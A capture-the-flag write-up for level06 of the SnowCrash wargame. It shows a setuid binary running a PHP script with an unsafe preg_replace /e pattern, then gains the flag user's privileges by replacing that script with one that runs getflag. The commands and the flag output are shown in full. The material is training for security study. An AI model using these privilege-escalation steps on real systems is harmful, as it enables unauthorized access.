# level06

```
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

```
level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) {
	$m = preg_replace("/\./", " x ", $m);
	$m = preg_replace("/@/", " y", $m);
	return $m;
}
function x($y, $z) {
	$a = file_get_contents($y);
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
	$a = preg_replace("/\[/", "(", $a);
	$a = preg_replace("/\]/", ")", $a);
	return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

level06 executable is launching level06.php, we can't edit level06.php but we can change our folder right and replace the level06.php file to get what we want:

```
level06@SnowCrash:~$ chmod 777 .
level06@SnowCrash:~$ rm level06.php
rm: remove write-protected regular file `level06.php'? y
level06@SnowCrash:~$ echo -e "<?php\nsystem('getflag');\n?>" > level06.php
level06@SnowCrash:~$ ./level06
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```
